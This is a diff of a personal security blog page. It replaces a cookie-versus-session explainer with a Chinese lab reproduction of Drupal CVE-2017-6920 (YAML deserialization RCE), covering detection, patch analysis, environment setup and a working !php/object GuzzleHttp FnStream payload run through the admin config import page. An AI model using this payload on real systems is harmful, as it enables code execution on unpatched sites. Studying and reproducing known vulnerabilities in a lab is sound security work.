@@ -105,20 +105,27 @@
 
 
 
-<meta name="description" content="链接：https://www.zhihu.com/question/19786827/answer/66706108来源：知乎 COOKIE和SESSION有什么区别？cookie保存在客户端，session保存在服务器端，Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是">
+<meta name="description" content="漏洞描述Drupal官方发布了一个编号为CVE-2017- 6920 的漏洞，影响为Critical。这是Drupal Core的YAML解析器处理不当所导致的一个远程代码执行漏洞，影响8.x的Drupal Core。">
 <meta name="keywords" content="web安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="COOKIE和SESSION的区别">
-<meta property="og:url" content="http://yoursite.com/2018/06/24/cookie/index.html">
+<meta property="og:title" content="Drupal远程命令执行漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2018/06/28/Drupal/index.html">
 <meta property="og:site_name" content="绝世狂龙">
-<meta property="og:description" content="链接：https://www.zhihu.com/question/19786827/answer/66706108来源：知乎 COOKIE和SESSION有什么区别？cookie保存在客户端，session保存在服务器端，Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是">
+<meta property="og:description" content="漏洞描述Drupal官方发布了一个编号为CVE-2017- 6920 的漏洞，影响为Critical。这是Drupal Core的YAML解析器处理不当所导致的一个远程代码执行漏洞，影响8.x的Drupal Core。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/9113981-48e15280c70af00a.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-06-24T14:46:34.769Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-57ed96e40aa67303.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-0c15d8d47eaa5574.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-ae00ffb4f49d47e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-4bf94a401b970b9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-5978d43eab33fa99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-adfd4e33fda265ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-9590a52d672f35b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-70aec34d1d987ede.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-06-28T10:47:36.158Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="COOKIE和SESSION的区别">
-<meta name="twitter:description" content="链接：https://www.zhihu.com/question/19786827/answer/66706108来源：知乎 COOKIE和SESSION有什么区别？cookie保存在客户端，session保存在服务器端，Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是">
-<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/9113981-48e15280c70af00a.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta name="twitter:title" content="Drupal远程命令执行漏洞复现">
+<meta name="twitter:description" content="漏洞描述Drupal官方发布了一个编号为CVE-2017- 6920 的漏洞，影响为Critical。这是Drupal Core的YAML解析器处理不当所导致的一个远程代码执行漏洞，影响8.x的Drupal Core。">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9113981-57ed96e40aa67303.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -148,14 +155,14 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/06/24/cookie/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/06/28/Drupal/"/>
 
 
 
 
 
 
-  <title>COOKIE和SESSION的区别 | 绝世狂龙</title>
+  <title>Drupal远程命令执行漏洞复现 | 绝世狂龙</title>
   
 
 
@@ -312,7 +319,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/24/cookie/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/28/Drupal/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="berlin">
@@ -329,7 +336,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">COOKIE和SESSION的区别</h1>
+          <h1 class="post-title" itemprop="name headline">Drupal远程命令执行漏洞复现</h1>
         
 
         <div class="post-meta">
@@ -341,8 +348,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-24T22:23:05+08:00">
-                2018-06-24
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-28T18:45:58+08:00">
+                2018-06-28
               </time>
             
 
@@ -401,17 +408,25 @@
       
 
       
-        <p>链接：<a href="https://www.zhihu.com/question/19786827/answer/66706108" target="_blank" rel="noopener">https://www.zhihu.com/question/19786827/answer/66706108</a><br>来源：知乎</p>
-<h2 id="COOKIE和SESSION有什么区别？"><a href="#COOKIE和SESSION有什么区别？" class="headerlink" title="COOKIE和SESSION有什么区别？"></a>COOKIE和SESSION有什么区别？</h2><p><strong>cookie保存在客户端，session保存在服务器端，</strong><br><strong>Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；</strong><br><strong>Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。</strong><br><strong>cookie</strong>目的可以<strong>跟踪会话，</strong>也可以<strong>保存用户喜好或者保存用户名密码</strong><br><strong>session用来跟踪会话</strong><br><a id="more"></a><br><strong>①</strong>当我们登录网站勾选保存用户名和密码的时候，一般保存的都是cookie，将用户名和密码的cookie保存到硬盘中，这样再次登录的时候浏览器直接将cookie发送到服务端验证，直接username和password保存到客户端，当然这样不安全，浏览器也可以加密解密这样做，每个浏览器都可以有自己的加密解密方式，这样方便了用户，再比如用户喜欢的网页背景色，比如QQ空间的背景，这些信息也是可以通过cookie保存到客户端的，这样登录之后直接浏览器直接就可以拿到相应的偏好设置。</p>
-<p>②跟踪会话，比如某些网站中网页有不同的访问权限，有只能登录的用户访问的网页或者用户级别不同不能访问的，但是http请求是无状态的，每次访问服务端是不知道是否是登录用户，很自然的想到在http请求报文中加入登录标识就可以了，这个登录标识就可以是cookie，这样的cookie服务端要保存有所有登录用户的cookie，这样请求报文来了之后拿到登录标识cookie，在服务端进行比较久可以了。再比如购物网站，多次点击添加商品到购物车客户端很容易知道哪些物品在购物车中，但是服务端怎么知道每次添加的物品放到哪个登录用户的购物车中呢？也需要请求报文中带着cookie才行（在不登陆的情况下京东也是可以不断添加商品的，推测应该是登录的时候一并创建cookie并且发送物品信息），这些cookie都是为了跟踪会话用的，所以客户端有，服务端也有，并且服务端有全部的会话cookie。</p>
-<p>后面衍生出session技术,session技术是要使用到cookie的，之所以出现session技术，主要是为了安全。</p>
-<p>http是无状态的协议，客户每次读取web页面时，服务器都打开新的会话，而且服务器也不会自动维护客户的上下文信息，那么要怎么才能实现网上商店中的购物车呢，session就是一种保存上下文信息的机制，它是针对每一个用户的，变量的值保存在服务器端，通过SessionID来区分不同的客户,session是以cookie或URL重写为基础的，默认使用cookie来实现，系统会创造一个名为JSESSIONID的输出cookie，我们叫做session cookie,以区别persistent cookies,也就是我们通常所说的cookie,注意session cookie是存储于浏览器内存中的，并不是写到硬盘上的，这也就是我们刚才看到的JSESSIONID，我们通常情是看不到JSESSIONID的，但是当我们把浏览器的cookie禁止后，web服务器会采用URL重写的方式传递Sessionid，我们就可以在地址栏看到 sessionid=KWJHUG6JJM65HS2K6之类的字符串。</p>
-<p><noscript><img src="http://upload-images.jianshu.io/upload_images/9113981-48e15280c70af00a.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></noscript></p>
-<p>大家请看在HTTP请求报文头的最后一行有cookie，不过是JSessionID的cookie值</p>
-<p>Cookie: $Version=1; Skin=new;jsessionid=5F4771183629C9834F8382E23BE13C4C</p>
-<p>比如前两个值，应该属于偏好设置之类的。</p>
-<p>服务端是怎么知道客户端的多个请求是隶属于一个Session呢？注意到后台的那个jsessionid=5F4771183629C9834F8382E23BE13C4C木有？原来就是通过HTTP请求报文头的Cookie属性的jsessionid的值关联起来的！（当然也可以通过重写URL的方式将会话ID附带在每个URL的后面哦）。<br>明白了原理，我们就可以很容易的分辨出persistent cookies和session cookie的区别了，网上那些关于两者安全性的讨论也就一目了然了，session cookie针对某一次会话而言，会话结束session cookie也就随着消失了，而persistent cookie只是存在于客户端硬盘上的一段文本（通常是加密的），而且可能会遭到cookie欺骗以及针对cookie的跨站脚本攻击，自然不如 session cookie安全了。</p>
-<p>通常session cookie是不能跨窗口使用的，当你新开了一个浏览器窗口进入相同页面时，系统会赋予你一个新的sessionid，这样我们信息共享的目的就达不到了，此时我们可以先把sessionid保存在persistent cookie中，然后在新窗口中读出来，就可以得到上一个窗口SessionID了，这样通过session cookie和persistent cookie的结合我们就实现了跨窗口的session tracking（会话跟踪）。<br>在一些web开发的书中，往往只是简单的把Session和cookie作为两种并列的http传送信息的方式，session cookies位于服务器端，persistent cookie位于客户端，可是session又是以cookie为基础的，明白的两者之间的联系和区别，我们就不难选择合适的技术来开发web service了。</p>
+        <h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>Drupal官方发布了一个编号为CVE-2017- 6920 的漏洞，影响为Critical。这是Drupal Core的YAML解析器处理不当所导致的一个远程代码执行漏洞，影响8.x的Drupal Core。</strong><br><a id="more"></a></p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p><strong>针对该漏洞，可采用两种方法进行检测：</strong></p>
+<p><strong>方法一：登陆Drupal管理后台，查看内核版本是8.x，且版本号低于8.3.4，则存在该漏洞；否则，不存在该漏洞；</strong><br><img src="https://upload-images.jianshu.io/upload_images/9113981-57ed96e40aa67303.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><strong>方法二：在Drupal根目录下找到文件/core/lib/Drupal/Component/Serialization/ YamlPecl.php，定位到函数public static function decode($raw)，如果该函数代码不包含” ini_set(‘yaml.decode_php’, 0);”调用，则存在该漏洞；否则，不存在该漏洞。</strong></p>
+<p><strong>这是存在该漏洞的代码块</strong><br><img src="https://upload-images.jianshu.io/upload_images/9113981-0c15d8d47eaa5574.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><strong>这是修复后的</strong><br><img src="https://upload-images.jianshu.io/upload_images/9113981-ae00ffb4f49d47e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>通过两个版本的文件可以发现漏洞的触发点，如上图。。<br>可以看到，8.3.4以后的版本 decode函数的开始处增加了如下的代码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static $init; </span><br><span class="line">if (!isset($init)) </span><br><span class="line">&#123; // We never want to unserialize !php/object. </span><br><span class="line">ini_set(&apos;yaml.decode_php&apos;, 0); </span><br><span class="line">$init = TRUE; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>漏洞所在函数decode的触发点代码如下：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = yaml_parse($raw, 0, $ndocs, [ </span><br><span class="line">YAML_BOOL_TAG =&gt; &apos;\Drupal\Component\Serialization\YamlPecl::applyBooleanCallbacks&apos;, ]);</span><br></pre></td></tr></table></figure></p>
+<p><strong>decode函数的参数$raw被直接带入了yamlparse函数中，文档官方对于yamlparse函数的描述如下：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yamlparse</span><br><span class="line">（PECL yaml&gt; = 0.4.0）yaml_parse  - 解析YAML流</span><br><span class="line">描述 </span><br><span class="line">mixed yaml_parse（string $ input [，int $ pos = 0 [，int＆$ ndocs [，array $ callbacks = null]]]）将全部或部分YAML文档流转换为PHP变量。</span><br><span class="line">参数 </span><br><span class="line">输入要解析为YAML文档流的字符串。</span><br><span class="line">pos从流中提取文档（所有文档为-1，第一个文档为0，...）。</span><br><span class="line">ndocs如果提供了ndocs，则会填充流中找到的文档数量。</span><br><span class="line">回调YAML节点的内容处理程序。YAML标记的关联数组=&gt;可调用映射。有关更多详细信息，请参阅解析回调。</span><br><span class="line">返回值 </span><br><span class="line">以适当的PHP类型返回在输入中编码的值，或者在失败时返回FALSE。如果pos为-1，则将返回一个数组，其中每个在流中找到的文档都有一个条目。</span><br></pre></td></tr></table></figure></p>
+<p><strong>第一个参数是需要parse成yaml的文档流。从上文来看，只有yaml_parse的第一个参数是外部可控的。官方对这个函数有一个特别的说明，也就是该漏洞的触发原理：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Notes </span><br><span class="line">Warning Processing untrusted user input with yamlparse() is dangerous if the use of unserialize() is enabled for nodes using the !php/object tag. This behavior can be disabled by using the yaml.decodephp ini setting. </span><br><span class="line">警告：如果为使用！php / object标记的节点启用了unserialize（），则使用yamlparse（）处理不可信用户输入是非常危险的。这种行为可以通过使用yaml.decodephp ini设置来禁用。</span><br></pre></td></tr></table></figure></p>
+<p>即可以通过!php/object来声明一个节点，然后用这个!php/object声明的节点内容会以解序列化的方式进行处理;如果要禁止这样做，就通过设置yaml.decode_php来处理，这就是官方补丁在decode函数前面加的那几行代码因此。 ，这个远程代码执行漏洞的罪魁祸首首当是yaml_parse函数可能会用反序列化的形式来处理输入的字符串，从而导致通过反序列化类的方式来操作一些危险类，最终实现代码执行。显然，控制decode函数的参数即可触发该漏洞先定位。decode函数的调用位置，在/core/lib/Drupal/Component/Serialization/Yaml.php中第33行发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static function decode($raw) &#123;</span><br><span class="line">$serializer = static::getSerializer(); </span><br><span class="line">return $serializer::decode($raw); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>函数该调用了getSerializer函数，该跟踪函数在/core/lib/Drupal/Component/ Serialization/Yaml.php中第48行发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">protected static function getSerializer() &#123;</span><br><span class="line">if (!isset(static::$serializer)) &#123;</span><br><span class="line">  // Use the PECL YAML extension if it is available. It has better</span><br><span class="line">  // performance for file reads and is YAML compliant.</span><br><span class="line">  if (extension_loaded(&apos;yaml&apos;)) &#123;</span><br><span class="line">    static::$serializer = YamlPecl::class;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    // Otherwise, fallback to the Symfony implementation.</span><br><span class="line">    static::$serializer = YamlSymfony::class;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">return static::$serializer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>如果存在YAML扩展，$serializer就使用YamlPecl类，然后调用YamlPecl这个类中的decode函数;如果不存在YAML扩展，就用YamlSymfony类中的decode。函数显然，一定要迫使代码利用YamlPecl类中的decode函数，这需要引入YAML扩展</strong><br>我是在windows环境下测试的，用的wamp，所以只说在wamp中引入yaml扩展<br>1、先看下自己php的编译版本<br>      Architecture                  ： x86 　　　　　　　　    编译系统架构：X86代表32位系统，X64代表64位系统<br>     Thread Safety　 　　　： enabled 　　　　　　线程安全： enabled 代表线程安全 disabled 非线程安全<br>      看下自己php的版本<br>      安装的时候去 <a href="http://pecl.php.net" target="_blank" rel="noopener">http://pecl.php.net</a> 搜索相对于的扩展<br>      nts— 代表非线程安全  ts代表线程安全<br>      找打合适i版本和把dll放在php扩展目录下即可。<br>想了解Linux下，看 <a href="http://blog.chinaunix.net/uid-26719405-id-4023961.html" target="_blank" rel="noopener">PHP-yaml 安装</a><br><strong>（1）YAML编译</strong><br>  <strong>在<a href="http://pecl.php.net/package/yaml下载TGZ源码包" target="_blank" rel="noopener">http://pecl.php.net/package/yaml下载TGZ源码包</a></strong><br><strong>（2）引用扩展</strong><br><strong>将然后php_yaml.dll放入PHP扩展文件夹下，然后修改php.ini中，将extension_dir写成phpyaml.dll所存放的目录，然后加上extension=php_yaml.dll。</strong><br><img src="https://upload-images.jianshu.io/upload_images/9113981-4bf94a401b970b9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-5978d43eab33fa99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>最后重启apache的，看到的phpinfo中有YAML扩展，就说明安装成功，如图：<br><img src="https://upload-images.jianshu.io/upload_images/9113981-adfd4e33fda265ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p><strong>1.序列化一个GuzzleHttp\Psr7\FnStream类,序列化后的字符串，给该序列化字符串加上yaml的!php/object tag(注意一定要转义)，最后得到的字符串如下：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!php/object &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\0GuzzleHttp\\Psr7\\FnStream\0methods\&quot;;a:1:&#123;s:5:\&quot;close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;s:9:\&quot;_fn_close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure></p>
+<p><strong>2.登录一个管理员账号，访问如下url</strong>: <a href="http://localhost/drupal833/admin/config/development/configuration/single/import，**然后我们进行如图所示的操作：*" target="_blank" rel="noopener">http://localhost/drupal833/admin/config/development/configuration/single/import，**然后我们进行如图所示的操作：*</a>*<br><img src="https://upload-images.jianshu.io/upload_images/9113981-9590a52d672f35b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>然后点击import按钮，就会执行phpinfo函数。<br><img src="https://upload-images.jianshu.io/upload_images/9113981-70aec34d1d987ede.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>本文参考内容：  <a href="https://paper.seebug.org/334/" target="_blank" rel="noopener">https://paper.seebug.org/334/</a><br>              <a href="http://baijiahao.baidu.com/s?id=1581449721290524096&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">http://baijiahao.baidu.com/s?id=1581449721290524096&amp;wfr=spider&amp;for=pc</a></p>
 
       
     </div>
@@ -458,8 +473,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/06/24/XSS0/" rel="next" title="XSS">
-                <i class="fa fa-chevron-left"></i> XSS
+              <a href="/2018/06/26/ctf/" rel="next" title="安恒杯赛Write Up">
+                <i class="fa fa-chevron-left"></i> 安恒杯赛Write Up
               </a>
             
           </div>
@@ -467,10 +482,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/06/26/ctf/" rel="prev" title="安恒杯赛Write Up">
-                安恒杯赛Write Up <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -663,7 +674,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#COOKIE和SESSION有什么区别？"><span class="nav-number">1.</span> <span class="nav-text">COOKIE和SESSION有什么区别？</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞描述"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞检测"><span class="nav-number">2.</span> <span class="nav-text">漏洞检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞验证"><span class="nav-number">4.</span> <span class="nav-text">漏洞验证</span></a></li></ol></div>
             
 
           </div>
